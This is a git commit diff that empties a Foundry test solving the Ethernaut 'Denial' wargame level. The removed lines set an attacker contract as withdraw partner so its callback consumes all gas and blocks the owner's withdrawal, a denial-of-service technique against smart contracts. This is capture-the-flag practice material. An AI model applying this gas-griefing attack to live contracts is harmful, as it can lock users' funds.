bc20340599b54d1de476adce4e42f4a8263c1dc9
Mis4nthr0pic <121455563+Mis4nthr0pic@users.noreply.github.com>
2023-07-07 21:30:06 -0300

    Update Denial.t.sol

--- src/test/Denial.t.sol
+++ src/test/Denial.t.sol
@@ -20,32 +20,6 @@ contract DenialTest is DSTest {
     }
 
     function testDenialHack() public {
-        /////////////////
-        // LEVEL SETUP //
-        /////////////////
-
-        DenialFactory denialFactory = new DenialFactory();
-        ethernaut.registerLevel(denialFactory);
-        vm.startPrank(eoaAddress);
-        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(denialFactory);
-        Denial ethernautDenial = Denial(payable(levelAddress));
-
-        //////////////////
-        // LEVEL ATTACK //
-        //////////////////
-
-        // Create DenialHack Contract
-        DenialHack denialHack = new DenialHack();
-        
-        // set withdraw parter. callback function will waste all pased gas when admin calls "withdraw"
-        ethernautDenial.setWithdrawPartner(address(denialHack));
-
-        //////////////////////
-        // LEVEL SUBMISSION //
-        //////////////////////
-
-        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
-        vm.stopPrank();
-        assert(levelSuccessfullyPassed);
+       
     }
 }
